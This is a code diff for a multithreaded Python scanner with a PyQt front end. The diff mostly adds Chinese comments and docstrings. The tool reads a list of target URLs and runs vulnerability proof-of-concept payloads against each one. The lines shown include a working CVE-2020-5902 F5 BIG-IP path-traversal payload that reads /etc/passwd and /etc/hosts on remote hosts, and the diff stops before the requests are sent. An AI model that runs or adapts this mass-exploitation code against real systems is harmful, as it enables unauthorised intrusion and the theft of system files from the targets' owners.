@@ -7,6 +7,8 @@
 # @Software: PyCharm
 
 import sys
+from datetime import datetime
+
 import OperatingUi
 import re
 import importlib
@@ -24,28 +26,50 @@ import requests
 import time, random
 import json
 
+# 取消SSL证书错误告警
 requests.packages.urllib3.disable_warnings()
 
+# Headers 信息配置
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
 Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400"
 }
 
-
 def getTime():
+    """
+    :param message:时间戳 设置
+    :return:当前时间
+    """
     now = datetime.now()
     return now.strftime('%H:%M:%S')
 
-
 def showSuccess(message):
+    """
+    :param message:设置输出样式,带有彩色样式标记
+    :return:无返回值
+    """
     print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))
 
 # 主入口
 class BackendThread(QThread):
+    """
+    :param message:主程序入口
+    :update_date:
+    :update——status:
+    :return:无
+    """
     update_date = pyqtSignal(str)
     update_status = pyqtSignal(str)
 
     def __init__(self, thread_num, payload, targetTxtPath, flag):
+        """
+        :param message:初始化参数
+        :param  thread_num:进程数量
+        :param  payload:攻击载荷
+        :param  targetTxtPath:文件读取路径
+        :param  flag:?????
+        :return:无
+        """
         super(BackendThread, self).__init__()
         self.thread_num = thread_num
         self.payload = payload
@@ -53,23 +77,44 @@ class BackendThread(QThread):
         self.flag = flag
 
     def __del__(self):
+        """
+        :param message:等待
+        :return:无
+        """
         self.wait()
 
     def run(self):
+        """
+        :param message:设置队列和扫描任务
+        :return:无
+        """
         self.url_queue = Queue()
         self.start_url_scan(self.thread_num, self.payload, self.flag)
 
-    # 获取文件url，并添加队列
     def get_base_data(self):
-        url_list = [i.replace("\n", "") for i in open(self.targetTxtPath, "r").readlines()]
+        """
+        :param message:获取文件url，并添加队列
+        :return:无
+        """
+        with open(self.targetTxtPath, "r") as targetTxtPath:
+            # 自动处理开启文件，处理之后会自动关闭，防止过量读取内容占用内存
+            url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]
+
         for url in url_list:
             self.url_queue.put(url, block=False)
 
-    # 获取漏洞POC扫描结果
     def poc_scan(self, payload):
-        while not self.url_queue.empty():  # 如果while True 线程永远不会终止:
+        """
+        :param message: 获取漏洞POC扫描结果
+        :param payload: 攻击载荷
+        :return:
+        """
+        while not self.url_queue.empty():   # 判断队列内容是否为空,如果不为空将队列内容循环处理。
+            # 延迟执行
             time.sleep(random.random())
+            # 逐条获取队列内数据
             url = self.url_queue.get()
+            # 判断获取URL的情况，1、None存在空行导致 2、判断URL 是否为HTTPS开头 3、如果存在HTTP://开头的URL则可能出现BUG
             if url is None:
                 break
             elif 'https://' in url:
@@ -78,6 +123,7 @@ class BackendThread(QThread):
                 url = 'https://' + url
             else:
                 break
+            # 载入Payload
             if payload == 'CVE_2020_5902_BIG_IP_RCE':
                 payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
                 payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'
